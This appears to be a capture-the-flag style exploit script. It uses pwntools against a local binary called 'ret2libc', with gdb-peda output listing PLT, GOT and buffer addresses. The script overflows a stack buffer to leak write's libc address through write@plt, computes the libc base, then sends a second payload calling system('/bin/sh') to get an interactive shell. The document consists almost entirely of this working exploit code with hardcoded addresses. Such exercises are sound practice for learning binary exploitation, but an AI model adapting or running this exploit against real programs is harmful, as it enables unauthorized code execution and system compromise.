
'''
gdb-peda$ plt
0x8048300: gets@plt
0x8048310: __libc_start_main@plt
0x8048320: write@plt
gdb-peda$ p &vul
$1 = (<text variable, no debug info> *) 0x804843b <vul>
gdb-peda$ p &buf2
$2 = (<data variable, no debug info> *) 0x804a040 <buf2>

[0x804a014] write@GLIBC_2.0

'''
from pwn import *
context.log_level = 'debug'
p = process("./ret2libc")

# payload prepare

# write(1,buf2,20)
# stdin = 0 ,stdout =1 , stderr = 2
write_plt = 0x8048320
vul = 0x804843b
buf2 = 0x804a040

write_got = 0x804a014

p1 = "A"*22+p32(write_plt)+p32(vul)+p32(1)+p32(write_got)+p32(4)

# exp
p.recvuntil("hello")

p.sendline(p1)

write = u32(p.recv(4))
print hex(write)

libc = ELF("/lib/i386-linux-gnu/libc.so.6")
libc_base = write - libc.symbols["write"]
system = libc_base + libc.symbols["system"]
bin_sh = libc_base + libc.search("/bin/sh").next()

p2 = "A"*22+p32(system)+"BBBB"+p32(bin_sh)
p.sendline(p2)
p.interactive()

